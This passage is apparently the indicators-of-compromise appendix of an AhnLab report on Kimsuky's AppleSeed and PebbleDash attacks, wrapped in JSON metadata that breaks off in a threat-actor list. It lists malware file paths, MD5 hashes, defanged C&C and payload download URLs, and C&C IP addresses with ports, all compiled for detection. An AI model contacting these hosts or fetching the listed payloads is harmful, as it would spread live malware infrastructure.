Account**\n%ALLUSERSPROFILE%\\net.exe\n%ALLUSERSPROFILE%\\net-add.exe\n%APPDATA%\\media\\wmi-ui-9cde8e85.db\n\n**RDP Patch Malware**\n%TEMP%\\pms6e3e.tmp\n\n**UACMe**\n%ALLUSERSPROFILE%\\su.db\n\n**Privilege Escalation Malware**\n%ALLUSERSPROFILE%\\lala.exe\n%ALLUSERSPROFILE%\\c.exe\n%ALLUSERSPROFILE%\\lala.dll\n%ALLUSERSPROFILE%\\n.dll\n\n**Powerkatz**\n%ALLUSERSPROFILE%\\hi.db\n%ALLUSERSPROFILE%\\edge\\powerkatz-x64.exe\n%ALLUSERSPROFILE%\\pacs8.exe\n%SystemDrive%\\users\\[User name]\\documents\\pkt.exe\n%SystemDrive%\\users\\[User name]\\documents\\1\\pkt.exe\n%SystemDrive%\\users\\[User name]\\documents\\powerkatz-x64.exe\n\n**Malware for Stealing Chrome Account Credentials**\n%ALLUSERSPROFILE%\\cc.dat\n\n**Keylogger**\n%ALLUSERSPROFILE%\\ahnlab\\install.cfg\n\n**Proxy Malware**\n%ALLUSERSPROFILE%\\la.exe\n%ALLUSERSPROFILE%\\ll.exe\n\nFile Hashes (MD5)\n\nThe MD5 of the related files is shown below. However, it might be omitted if there is a sensitive sample.\n\n**Script**\n357a56dbc9e8b43d8ca09a92eac9b429\n04b207967c38414d99a7da2b718c440f\nc7844002ba15798f2c240f2b629d90c2\n3a4ab11b25961becece1c358029ba611\n609f8450e024ed88b130f13d6d7b213f\n159dd4d84fd6c5d1bb807cdb02215cf8\nf0255dfcb932c3072c2489124b25b373\ne7cf7c466e90f2b580ce89e4f8ef2af6\n9c86a941cfb1ecbc580aea99b7d18e90\n6c82e7b8fe3fd401573a822f6d1455e9\n\n77\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\nd9064c446b39e23822cb3b2680a0e052\n8b274243a5179028388a2c17c75afb9f\n\n**PIF Dropper**\n96c6ad44b9bb85e9e57bfea7e441d131\ne8da7fcdf0ca67b76f9a7967e240d223\naa65c226335539c162a9246bcb7ec415\n2ff981ba02b1c5a8487b858265b037de\n815c690bfc097b82a8f1d171cd00e775\nb567f7aac1574b2ba3a769702d2f6a1e\n93758669e4f689b2f3b8b9ee6189c3df\n7e041b101e1e574fb81f3f0cdf1c72b8\n946f787c129bf469298aa881fb0843f4\n\n**PIF Dropper (UPX Unpack)**\n51c19c3ac15f7434b777effd4e490b41\ne521c68ac280c00b0e27cbd2fed4c9c4\n\n**Downloader**\ne413c5922addcde26edc5d72c3f3163d\n768c84100d6e3181a26fa50261129287\n218b391172f990ec35e08a221b77fa14\n2a57aea6acc479332cf176aa9e976015\n23ea8eba791c783dd197ac3695b57a92\nacc36ffa4f40016b483deac1f78cf07d\n8414d95877acde1b2557d7ab8ac0119f\n6603e6628ca799ea21822d9952ce048a\n54a0fdabbdf7e77509850e25ab956094\n447163d776b62bf0b1c652c996cc0586\nee5a33cc147a56fe8e77cc37a4320527\n\n**Downloader (UPX Unpack)**\n19e09cfdcfe0c255c50b67d52b6a7afe\n\n**AppleSeed - HTTP**\n7348d1f1f1ca3b7ff25b362231365904\naef664a85be61781dc20af81a644cfa3\nf0dbc8a4d62ebb22c0bae473de1c98d2\n0d9f8b5b7417896508a49047a5eb18eb\n911937edadd017d5475570a1207bc3eb\n8355964a47f248ed39caccb733aabc44\nfd805335efa9ef39b121c7f1cec6ff83\n151af490f16384372473f7696c90aa2a\n07db667386e71a3334d79d93b26e930b\n2401ad5f935df2757214a84538bdfdde\n684b27302d9e5e6558651bd1ab50f5d7\nf928a8eb6a04e8c47eafbed8ff014ed1\n5c8afc7e08e480d10122c007b0b0cdf4\nfea415382e510eea7b49ddc68cbdc402\n7b6d65191d091bdd7c997ffcd670b018\nc9ede077ec500240864c47c69fe5c728\n5ce3a4eddba6ec8273db024b1813a530\nd228d8453f1249f2177f376bfae4b10f\n29d2895afb76ae73705b05847d3b2384\nd68454cfef64f71caaa9c4f44c016a68\n04d0856afb1aa9168377d6aa579c5403\n44222674cf1175859b1756038f030e2d\n866d2981320c69db5294d0761788f05a\n\n\n78\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\n2142739359fd0c614ffe3e2fcbc8c89d\n1ce204f16d458e78ed8de91c332545cc\n3913423877bd01729a63ba6dd075a19c\nd7b2cf6c8597d12d30aca68b277912af\nba615365f00a2a631c6f8ccafdf52a80\nd214790381ab8d1bfb909ac0b0d38051\nd77dd109df7874e3c2cb72e9e169f909\n1eefdfd7b83c2be2c388acb4b19fdd50\n43e65ed5d864f0994277e4cdb217e9dd\n801894c7f962e48e2fa35260b8f37a65\nd6727e4a3f84d99d4e97ff6fb246c33b\n60a65964fe90e1fd7d3d50623ed05083\n89fff6645013008cda57f88639b92990\n66b33561a84a8a8b78883b5e83ef76e5\nde02fd9415983147bacfb839658aef7a\ncb9f97f06743c4592b5c5b0b2538ae5c\n373a04225dd9b0d99cab3ed9ca970a23\nb239679d6cd70e0d4ae30852005752ca\nef75f528fb738e9519950bd615c85f8e\nae47cd69cf321640d7eebb4490580681\n8814fc3d81b3a948f54b0c035ece41aa\n3d235aa8f66ddeec5dc4268806c22229\n537b319927c0a7fbfaa0d411283069e3\n076fcf70558836549151e7685adb1203\n9d00bf9a834d6d5361b4a281aaa9ddd0\n605c3dee08569692b67f25a47cb4a397\n10b9702f8096afa8c928de6507f7ecfe\ndf14d5c8c7a1fb5c12e9c7882540c3c0\n41a8fc708ea0181c704a10b71771620c\nd3eee11514cf901b273bcbd4d91c8af5\na44966b7ddddbc62d7eb967d34812840\n7c86ce42fed192ba7d1e09af0a7bf821\n4ea6280e76b8c9fd6432faab3e1566b7\ne6bc6e7fd86c5000d6557416e765ee7d\n03cf908006d0b6bcac671ebc88f1ddf7\n43917a2b19e25e3ffd110188404691d5\n5aa0393b910b3f94b327e4e6162265fc\n4d7816bb6f22dc76d3564e312a38ecc8\nca5c311cdf05a4661dc490e0929cdef1\na36414bf5195e523797d6e30a2e1225b\n157160589dc3d5bad2e7ed15629b87d6\na03598cd616f86998daef034d6be2ec5\n85ae0be9411b1ab0d7644347af0f7f07\ned17ac8d2ee4a3b145e5784887b2499a\n8b775c805427560a4cedd900c8e63863\n80a2bb7884b8bad4a8e83c2cb03ee343\nd916c3533a89e498159fc432d645edb8\n14e01ed4d086206d3c4b7159dc887f25\n739d14336826d078c40c9580e3396d15\ndf0ed691353427377f58972a113b75eb\n165f120ac79eda977d10f2f5203ff067\n541fa4fb60690ffbe48b24cd2eeda32e\ne40cb1328cf00cc490a7239141db3661\n4d20e2f1c2e8e9503d2bf7d0422b7ac7\n171e12e3673eb0f934ce94cb583daccc\n7480f871e59de96aaf2a20271ef2eab6\n68eddf7fe33ac28a71f63437e2320b43\n2cb77491573acc5e8198d8cf68300106\n\n\n79\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\n07c52157eb97ebe792b03e3a9d8a8240\n499b72fc9973d2f2ee6679fd60d9dbaf\n876db1153d0689092619315a61138c47\nde9254369b928eaab82c84be777ebd05\n9f9fd9812bac6bc71fe553c82faede94\nbbc79820ccc040a54d2327ec28875377\n734e034f968f13b4fbe5eddf443c4435\nc7fbffb557c2006fd3316470e0c763d2\na40d47de39d25452af79cf1a9f812ee1\n41950ac0d33adce8c8dcd0bed0e76591\n3c47e1074f0845f50b615f1fb99b3bd8\n1976fe2bc1011c02ff50c807f97cb230\ncaa1a847d0ae3f3d647474f5db9069bf\nc019e4bd1d192e08c56135a501a828fe\n25afb96dc0db40d2de6313ce9fa7fdc7\n28e0e331b4657e2383978c3fba89d7af\n8f19fb2998e24bd05ff39bf2a704acd7\n4e58ea982e3e95fe7b1bdb480ab9810e\n\n**AppleSeed - HTTP (UPX or Self Unpack)**\n445299630a7675b2dbdc0ddfb08181a0\n21994210ecb683ebccfaeda7a58b93f4\ndd94918ac64425f9e14d3ee11fd22f26\nc9540a5128ff77cf184b894a09a2fbb0\n03b56d2764a29625fd7f804d0e431ab9\n2d1f1132ab7e80a6a8546dd2ac45bd89\nc1681bd8a0bfb54f208d2d1eee6693ec\n9465a1a8cd418b8737e4c1f7dbe919f7\n1de3b318b8a6636627004c6c43c87254\n179ebbc3ea95ebaf882e997c469e800b\n0ab009337ba3ed59560851db078e170a\n8abb227a7c90a24e57e987cbf1cea1b4\n907590565c5d3494addcd561736135df\n7842a386fcd8bb8572b19383fed0b1e1\nc688c60c94ead98f772c20cf18fb02d1\nb5e2fff1591aa8331a1b9dfd1b2be435\nc861f25bb943f77a909b33d62bb71926\n8220d11b69ad5e516234405e00e899e0\n5969b33fc2e70e9d007edd7ec8b8c7ea\naed94d4b249d93c40c63267b9106f7a9\n7b623d8d8821cdea344b58e8b392a77a\ne6d6cb76e2c91b6771b4fb4e19785e76\na22b6ee659d80bfc4e0d51f46973eff0\ne98fae79f1c389313fcc27343ea2e359\n0c4c830daac33221188e3c5461b35b6b\n\n**AppleSeed - EMAIL**\n98015898c06603cc50bf0ed1eaf8fdff\n8c5c844eb8612235cfbdf1fc8c59af65\ndacb71c5eac21b41bb8077fe2e9f5a25\n35ee0f5d686e72aba04253b0b39d19fe\nf2a39067724a227f6f7bc0f0602bae32\n18d94704439c9eda33ea49eab40d99a5\n0c6da2b9f9a5d8b3cf01f682c097f48b\n\n**AppleSeed - EMAIL (UPX Unpack)**\n2c49b207dcd0454e6e7486ce6126f3e0\n3bad087e698b257d5c3b8ac11392973d\n\n\n80\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\n40add75d64cebbc6f9054d0fa7a3d8cf\n1d759150d2364a2fd0db7c22049ada22\n6844589e2962b3914824cc8b90a552a6\na213a2bdfb76bcb4957568f08f753b85\n\n**Initial Version PebbleDash**\n8251bd566bdc6363b53f73224e4bd12b\nbb9641441dbc300939077bc3a0b60846\n3998926526d5950c62ca2ec0225b8e7e\n232279212c0ac76e13c524ba32fb545b\n4ffcb40b7ef5f475e75d972dd69bb7fb\nc78523f37f856d9743638ce1b0128fcd\n7c2fcbb47a97709b7b4c7001000882fd\nb3ed33cf6d37e45b013afc4c6bbb84d9\n\n**Initial Version PebbleDash (Self Unpack)**\nbaed0df969bdc9d914040b75bb3a7b8f\n\n**Latest Version PebbleDash**\ne33a34fa0e0696f6eae4feba11873f56\nbbab9d691b616df065049d4c1c4f356f\n5c04be3a9e52e04500e1b729988ab902\n3c3f2c3df0ddefebe51ce8fc9fd888f8\na9a495491914257afc294fa6c2d215ba\n\n**Latest Version PebbleDash (Unpacked)**\n9fa3d317b62fe14eab225d56f3c9509d\ndf0c27db9b5d8133d07b36d2c90eab56\n\n**Meterpreter**\ne37836c1f65fa321c7301c4062a1776c\nc61b965dae6f5e745f075825f3ec20d5\n420634db019dc28b89bf9d2e6fe5db6d\n107f917a5ddb4d3947233fbc9d47ddc8\n6e8406d6680899937f23c788a7008a11\n7f4624a8eb740653e2242993ee9e0997\n8ae6d97cfd68f3866a60b11d4dfbace5\nd5ad5ffde477e3bc154a17b4d74f401b\nd4da4660836d61db95dd91936e7cfa4a\n3ef24a88fe011e4f6ef2639966beefa8\n374a036525987bda63adeefd329e2b67\n0a3c27b2bf7cd8d0913102c2931f025b\n9cd1b48fba4ce9189d1cc6e522c8fbad\n7872a5dfce3c3212e9cbe40d1541f9f6\n7656801585f0c037834438a7d7f1288f\n06f5957a2247b6e1ae0f55a3c4633b45\nd010a3f121d80705e6622ded206835ac\ne192c1495e9d7cf18812a7a03a1e84f2\n07adf13da4b6087c458b91a519a97d83\na714973224c833adb34aef84ff5e20f3\n7f6ea229797148c0cd399132fb6e4069\n3cfb46d86380f53788e5712a912ae6a5\n11c6f97aaa583fc631f34af918516873\n37e7d679cd4aa788ec63f27cb02962ea\ne582cf21c5f1951cf4dffd79d7e5403d\n\n**Meterpreter (UPX Unpack)**\n11d3b490638d0376afe3540df88a6476\n\n\n81\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\n**HVNC**\n00ced88950283d32300eb32a5018dada\n535827d41b144614e582167813fbbc4c\n67aa7ddecc758dddfa8afc9d4c208af1\n93efab6654a67af99bbc7f0e8fcf970f\nf7839eeb778ff17cf3c3518089f9bbec\ndd90cb5dcd7bd748baa54da870df606c\n5bd6cb6747f782c0a712b8e1b1f0c735\n16c0e70e63fcb6e60d6595eacbd8eeba\n76c5f8173c93acc11328602cfae6c1aa\n\n**HVNC (UPX Unpack)**\na1bcf8508c52b1cc7c353eddc36edbd5\n1f498103d59cc423bb2136f100ead563\n99c200d13b4ab4f61e1c41ff99296204\n\n**TightVNC**\n26eaff22da15256f210762a817e6dec9\n088cb0d0628a82e896857de9013075f3\n9a71e7e57213290a372dd5277106b65a\ndb4ff347151c7aa1400a6b239f336375\n4301a75d1fcd9752bd3006e6520f7e73\na07ddce072d7df55abdc3d05ad05fde1\n5b6da21f7feb7e44d1f06fbd957fd4e7\n4fdba5a94e52191ce9152a0fe1a16099\nbb761c2ac19a15db657005e7bc01b822\n\n**TightVNC (UPX Unpack)**\nbe14ced87e2203ad5896754273511a14\n\n**rdpconf.exe**\n03fb8e478f4ba100d37a136231fa2f78\n\n**rdpwinst.exe**\n1177fecd07e3ad608c745c81225e4544\n\n**rdpwinst.exe (UPX Unpack)**\n887003ed5ecba696d58d36e495f194b9\n\n**rdpwrap.dll**\n461ade40b800ae80a40985594e1ac236\n\n**Malware for Adding Account**\n5de4061060f363a7b8821368548b4ffa\na5ef533b1ab7f99678981a2921010091\n\n**Malware for Adding Account (UPX Unpack)**\na77c57f9762325f476eea6beef85e330\nbb8a3d46abe639a429137d82000e9374\n\n**RDP Patch Malware**\ne94f99d08a85de47e4b64fd1d38f2586\n\n**UACMe**\nbfd9090cd62ae39da81698601c208952\n\n**UACMe (UPX Unpack)**\n\n\n82\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\n9b194fd9a101f5880976d1a36c416550\n\n**Privilege Escalation Malware**\n4c814e4344f8865b58bdd7f54436b355\n8c8207fa4050635f43ff6e7f712c658b\n8ec1e9f9bfb99e560b1b489e95713313\n\n**Powerkatz**\ne83578514353897b42f5bebe3d7603f1\nafafb039d9143257d68553cafacc1992\n\n**Powerkatz (UPX Unpack)**\n96dbe0326dad80b1f3de6bb156a727c8\n\n**Malware for Stealing Chrome Account Credentials**\n4f01512ba32bc4d6cc2a6884ed569e55\n\n**Keylogger**\n2978850265521ef9d820fc127f5ca77d\ncb4f6a13a94d6fc2c4cd1a6ba416a3d5\n\n**Keylogger (UPX Unpack)**\n4a74790ca680dc58fa64b7cfc94d7ed3\ndb9bbea9674a494b1d43c73237bb28b9\n\n**Proxy Malware**\n34c07d081f4d0959a4ba68de36229256\nfab60b7dabd444341023055638dee1bc\n\nRelated Domain, URL, and IP Address\n\nThe download and C&C URLs that are used are listed below. (http was changed to hxxp.) The URL may\nbe omitted if it contains sensitive information.\n\n**PIF Dropper**\nhxxp://pollor.p-e[.]kr/?query=5\nhxxp://get.seino.p-e[.]kr/?query=5\nhxxp://d.vtotal.n-e[.]kr/?query=5\nhxxp://exchange.amikbvx[.]cf/?query=5\nhxxp://mail.kumb[.]cf/?query=5\nhxxp://vpn.atooi[.]ga/?query=5\n\n**VBS Malware**\nhxxp://get.seino.p-e[.]kr\n\n**Downloader**\nhxxp://ai.woani[.]ml\nhxxp://app.veryton[.]ml\nhxxp://biz.gooroomee[.]ml\nhxxp://com.dshec[.]ml\nhxxp://eastsea.or[.]kr\nhxxp://hao.aini.pe[.]hu\nhxxp://imap.pamik[.]cf\nhxxp://love.krnvc[.]ga\nhxxp://pc.ac-kr.esy[.]es\n\n83\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\n**AppleSeed - HTTP**\nhxxp://accont.estcoft.kro[.]kr//\nhxxp://account.googledriver[.]ga//\nhxxp://adobe.acrobat.kro[.]kr//\nhxxp://ahnlab.check.pe[.]hu/upload/\nhxxp://alps.travelmountain[.]ml//\nhxxp://anto.shore[.]ml//\nhxxp://aprodite.olympus.kr-infos[.]com//\nhxxp://banana.baochoiah[.]store//\nhxxp://banana.raminunahg[.]space//\nhxxp://beast.16mb[.]com//\nhxxp://benz-oh-haapy.96[.]lt//\nhxxp://bhigr.baochoiah[.]store//bnioww/\nhxxp://bmw-love.890m[.]com//\nhxxp://boars.linecover[.]xyz//\nhxxp://channel-shop.manage-tech[.]club//\nhxxp://check.sejong-downloader.pe[.]hu//\nhxxp://cold.miontranck[.]host/drink/\nhxxp://confirm.assembly-check-loader.pe[.]hu//\nhxxp://cordova2020.esy[.]es//\nhxxp://cuinm.huikm.kro[.]kr//\nhxxp://dept.lab.hol[.]es//\nhxxp://depts.washington[.]edu/dswkshp/wordpress/wp-content/themes/twentyfifteen/inc/io/\nhxxp://do.giveme.r-e[.]kr//\nhxxp://dongnam2014.cafe24[.]com/image/main/sub/\nhxxp://driver.spooler.p-e[.]kr//\nhxxp://eastsea.or[.]kr//\nhxxp://elle-mart.pe[.]hu//\nhxxp://estsft.autoupdate.kro[.]kr//\nhxxp://ffd-fund.pe[.]hu//\nhxxp://greatname.000webhostapp[.]com//\nhxxp://help.mappo-on[.]life//\nhxxp://help.octo-manage[.]net//\nhxxp://helper.canvas-life[.]me//\nhxxp://help-super.pe[.]hu//\nhxxp://hotmail.mail-help[.]me/file1/\nhxxp://hotmail.mail-help[.]me/file2/\nhxxp://ijljhsw.heroheroin.host//\nhxxp://inchon.decaft[.]live//\nhxxp://iuqsd.baochoiah[.]store/zvxcty/\nhxxp://kamaze-love.96[.]lt//\nhxxp://kcxxwr.pagelock.host//\nhxxp://mail-post-check[.]pe.hu//\nhxxp://mjseu.dogshouse[.]online//\nhxxp://monkey.funnystory[.]tech//\nhxxp://nahika.webguiden[.]online//\nhxxp://office.lab.hol[.]es//\nhxxp://onedrive-upload.ikpoo[.]cf//\nhxxp://park.happysunday[.]space//\nhxxp://part.bigfile.pe[.]hu//\nhxxp://ping.requests.p-e[.]kr//\nhxxp://platoon.soliders[.]uno//\nhxxp://ppahjcz.tigerwood.tech//\nhxxp://proce.soute.kro[.]kr//\nhxxp://projectgreat.000webhostapp[.]com//\nhxxp://rolls-royce-love.890m[.]com//\nhxxp://seoul.lastpark[.]life//\n\n\n84\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\nhxxp://smile.happysunday[.]space//\nhxxp://snow-mart.pe[.]hu//\nhxxp://snu-ac-kr.pe[.]hu//\nhxxp://studio.lab.hol[.]es//\nhxxp://studio-sp.lab.hol[.]es//\nhxxp://suzuki.datastore.pe[.]hu//\nhxxp://term.invertion[.]press//\nhxxp://texts.letterpaper[.]press//\nhxxp://update.hdac-tech[.]com//\nhxxp://update.netsvc.n-e[.]kr//\nhxxp://update.nhuyj.r-e[.]kr//\nhxxp://update.ssnuh.kro[.]kr//\nhxxp://updown.kasse-tech[.]club//\nhxxp://upload.bigfile.hol[.]es//\nhxxp://upload.bigfile-nate.pe[.]hu//\nhxxp://upload.mydrives[.]ml//\nhxxp://upload.myfilestore[.]cf//\nhxxp://upload-confirm.esy[.]es//\nhxxp://washer.cleaninter[.]online//\nhxxp://yes24-mart.pe[.]hu//\nhxxp://yes24-mart.pe[.]hu/bear/\nhxxp://you.ilove.n-e[.]kr//\n\n**AppleSeed - EMAIL**\nhelper.1.1030@daum[.]net\nk1a0604a@daum[.]net\nk1sheliak88@daum[.]net\nk1-tome@daum[.]net\nk21yn@daum[.]net\nk2x0604@daum[.]net\n\n**Initial Version PebbleDash**\n41.92.208[.]195:443\n98.159.16[.]132:443\n211.233.13[.]11:443\n112.217.108[.]138:443\n\n**Latest Version PebbleDash**\nhxxp://movie.youtoboo.kro[.]kr/test.php\nhxxp://news.scienceon.r-e[.]kr/view.php\nhxxp://www.onedriver.kro[.]kr/update.php\n\n**PebbleDash Download URL**\nhxxp://new.jungwoo97[.]com/install.bak/1u.exe\nhxxp://new.jungwoo97[.]com/install.bak/1.exe\n\n**Meterpreter**\n23.106.122[.]239:3001\n27.102.112[.]44:8080\n27.102.114[.]63:3001\n27.102.114[.]63:80\n27.102.127[.]240:3001\n27.255.79[.]204:30000\n27.255.81[.]109:3015\n31.172.80[.]100:3001\n31.172.80[.]104:3001\n37.172.80[.]104:3001\n64.14.211[.]175:3015\n\n\n85\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\n79.133.41[.]237:4001\n79.133.41[.]248:5600\n210.16.120[.]251:443\n\n**HVNC**\n27.102.102[.]70:33890\n27.102.112[.]58:33890\n27.255.81[.]109:33890\n27.255.81[.]71:33890\n31.172.80[.]104:3030\n61.14.211[.]174:33890\n79.133.41[.]237:3030\n\n**TightVNC**\n27.102.114[.]79:5500\n27.102.114[.]89:5500\n27.102.127[.]240:5500\n27.102.128[.]169:5500\n27.255.81[.]109:5500\n27.255.81[.]71:5500\n31.172.80[.]104:5500\n61.14.211[.]175:5500\n\n\n86\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\nReference\n\n[1] [https://vblocalhost.com/conference/presentations/operation-newton-hi-kimsuky-did-an-appleseed-](https://vblocalhost.com/conference/presentations/operation-newton-hi-kimsuky-did-an-appleseed-really-fall-on-newtons-head/)\n[really-fall-on-newtons-head/](https://vblocalhost.com/conference/presentations/operation-newton-hi-kimsuky-did-an-appleseed-really-fall-on-newtons-head/)\n\n[2] [https://github.com/curl/curl](https://github.com/curl/curl)\n\n[3] [https://us-cert.cisa.gov/ncas/analysis-reports/ar20-133c](https://us-cert.cisa.gov/ncas/analysis-reports/ar20-133c)\n\n[4] [https://atip.ahnlab.com/ti/contents/issue-report/malware-analysis?i=8709a7d6-561a-4df3-8bd1-](https://atip.ahnlab.com/ti/contents/issue-report/malware-analysis?i=8709a7d6-561a-4df3-8bd1-a5fedce07717)\n[a5fedce07717](https://atip.ahnlab.com/ti/contents/issue-report/malware-analysis?i=8709a7d6-561a-4df3-8bd1-a5fedce07717) (Analysis Report on Privilege Escalation Using UAC Bypass)\n\n[5] [https://asec.ahnlab.com/ko/1160/ (GandCrab v4.3 distributed in the Nullsoft installer form)](https://asec.ahnlab.com/ko/1160/)\n\n[6] https://github.com/hlldz/CVE-2021-1675-LPE/\n\n[7] [https://atip.ahnlab.com/ti/contents/issue-report/malware-analysis?i=cc8cf212-f3ca-4134-812d-](https://atip.ahnlab.com/ti/contents/issue-report/malware-analysis?i=cc8cf212-f3ca-4134-812d-0e471d888923)\n[0e471d888923](https://atip.ahnlab.com/ti/contents/issue-report/malware-analysis?i=cc8cf212-f3ca-4134-812d-0e471d888923) (Analysis Report of the Internal Propagation Technique Using Mimikatz)\n\n87\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\nAhnLab Cyber Threat Intelligence Report\n\nThis report is protected by copyright law. You may not reprint or reproduce this material for profit\nwithout permission.\n\nWhen citing or editing the entirety or a part of the report, please state that this report is a publication\nof AhnLab.\n\n            - If you have any inquiries about the information about the report or its distribution, please contact\n[AhnLab (global.sales@ahnlab.com).](mailto:global.sales@ahnlab.com)\n\n[The report can be viewed via https://atip.ahnlab.com.](https://atip.ahnlab.com/)\n\n© AhnLab, Inc. All rights reserved.\n\n© AhnLab, Inc.\n\n220, Pangyoyeok-ro, Bundang-gu, Seongnam-si, Gyeonggi-do 13493, Korea\n\nTel: +82 -31-722-8000  |  Purchase Inquiry: [global.sales@ahnlab.com  |  Fax: +82-31-722-8901](mailto:global.sales@ahnlab.com)\n\nwww.ahnlab.com\n\n88\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "d63ae2b7-445f-460d-965d-2676dacdb6de",
            "created_at": "2022-10-25T15:59:19.552139Z",
            "updated_at": "2022-10-25T15:59:19.552139Z",
            "deleted_at": null,
            "name": "APTnotes",
            "url": "https://github.com/aptnotes/data",
            "description": "APTnotes data",
            "reports": null
        }
    ],
    "references": [
        "https://app.box.com/s/iygnjm6cv5mwzlry3ct3dtor049ci6pk"
    ],
    "report_names": [
        "AhnLab_Analysis-Report-of-Kimsuky-Group(01-05-2022)"
    ],
    "threat_actors": [
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "32a223a8-3c79-4146-87c5-8557d38662ae",
            "created_at": "2022-10-25T15:50:23.703698Z",
            "updated_at": "2025-03-27T02:00:55.528031Z",
            "deleted_at": null,
            "main_name": "Lazarus Group",
            "aliases": [
                "Lazarus Group",
                "Labyrinth Chollima",
                "HIDDEN COBRA",
                "Guardians of Peace",
                "NICKEL ACADEMY",
                "Diamond Sleet"
            ],
            "source_name": "MITRE:Lazarus Group",
            "tools": [
                "RawDisk",
                "Proxysvc",
                "BADCALL",
                "FALLCHILL",
                "WannaCry",
                "HOPLIGHT",
                "TYPEFRAME",
                "Dtrack",
                "HotCroissant",
                "HARDRAIN",
                "Dacls",
                "KEYMARBLE",
                "TAINTEDSCRIBE",
                "AuditCred",
                "netsh",
                "ECCENTRICBANDWAGON",
                "AppleJeus",
                "BLINDINGCAN",
                "ThreatNeedle",
                "Volgmer",
                "Cryptoistic",
                "RATANKBA",
                "Bankshot",
                "Torisma",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "dc78f675-b309-431d-8160-b8dcff037d4f",
            "created_at": "2024-05-01T02:03:08.142224Z",
            "updated_at": "2025-03-27T02:05:17.417972Z",
            "deleted_at": null,
            "main_name": "NICKEL KIMBALL",
            "aliases": [
                "Black Banshee ",
                "Crooked Pisces ",
                "Emerald Sleet ",
                "Kimsuky ",
                "Opal Sleet ",
                "SharpTongue ",
                "TA427 ",
                "THALLIUM ",
                "Velvet Chollima ",
                "APT43 "
            ],
            "source_name": "Secureworks:NICKEL KIMBALL",
            "tools": [
                " KONNI",
                " KimJongRAT",
                " Kimsuky",
                "BabyShark"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "9e767b38-12ae-4ef7-9878-5ce1701066d7",
            "created_at": "2024-05-01T02:03:08.131819Z",
            "updated_at": "2025-03-27T02:05:17.413497Z",
            "deleted_at": null,
            "main_name": "NICKEL ACADEMY",
            "aliases": [
                "COVELLITE ",
                "CTG-2460 ",
                "Diamond Sleet ",
                "Guardians of Peace",
                "HIDDEN COBRA ",
                "High Anonymous",
                "Labyrinth Chollima ",
                "NNPT Group",
                "New Romanic Cyber Army Team",
                "Temp.Hermit ",
                "The Lazarus Group ",
                "UNC577 ",
                "Who Am I?",
                "Whois Team",
                "ZINC ",
                "Black Artemis "
            ],
            "source_name": "Secureworks:NICKEL ACADEMY",
            "tools": [
                " DarkMessenger",
                " Destover",
                " Duuzer",
                " HOPLIGHT",
                " Joanap",
                " KorHigh",
                " LiveJinx",
                " Volgmer",
                "Brambul"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "8bc1a044-a23b-4904-903c-13f463605cb3",
            "created_at": "2024-05-01T02:03:08.136237Z",
            "updated_at": "2025-03-27T02:05:17.415795Z",
            "deleted_at": null,
            "main_name": "NICKEL GLADSTONE",
            "aliases": [
                "Bluenoroff ",
                "CTG-6459 ",
                "Citrine Sleet ",
                "HIDDEN COBRA ",
                "Lazarus Group",
                "Sapphire Sleet ",
                "Stardust Chollima ",
                "APT38 "
            ],
            "source_name": "Secureworks:NICKEL GLADSTONE",
            "tools": [
                " Bankshot",
                " CATCH22",
                " CCGC_Proxy",
                " Cur1Agent",
                " Ratankba",
                " Server_TrafficForwarder",
                " Wcry",
                "AlphaNC"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "a2b92056-9378-4749-926b-7e10c4500dac",
            "created_at": "2023-01-06T13:46:38.430595Z",
            "updated_at": "2025-03-27T02:00:02.831633Z",
            "deleted_at": null,
            "main_name": "Lazarus Group",
            "aliases": [
                "Operation DarkSeoul",
                "APT38",
                "ATK117",
                "DEV-1222",
                "G0032",
                "APT 38",
                "Stardust Chollima",
                "APT-C-26",
                "ATK3",
                "Diamond Sleet",
                "Hidden Cobra",
                "Unit 121",
                "Subgroup: Bluenoroff",
                "NICKEL GLADSTONE",
                "DEV-0139",
                "Andariel",
                "Operation Troy",
                "COVELLITE",
                "TA404",
                "Lazarus group",
                "Dark Seoul",
                "G0082",
                "NewRomanic Cyber Army Team",
                "Bluenoroff",
                "Appleworm",
                "Nickel Academy",
                "COPERNICIUM",
                "Hastati Group",
                "Bureau 121",
                "Operation AppleJeus",
                "Whois Hacking Team",
                "Citrine Sleet",
                "Sapphire Sleet",
                "Group 77",
                "Labyrinth Chollima",
                "Operation GhostSecret",
                "BeagleBoyz"
            ],
            "source_name": "MISPGALAXY:Lazarus Group",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "760f2827-1718-4eed-8234-4027c1346145",
            "created_at": "2023-01-06T13:46:38.670947Z",
            "updated_at": "2025-03-27T02:00:02.888195Z",
            "deleted_at": null,
            "main_name": "Kimsuky",
            "aliases": [
                "Thallium",
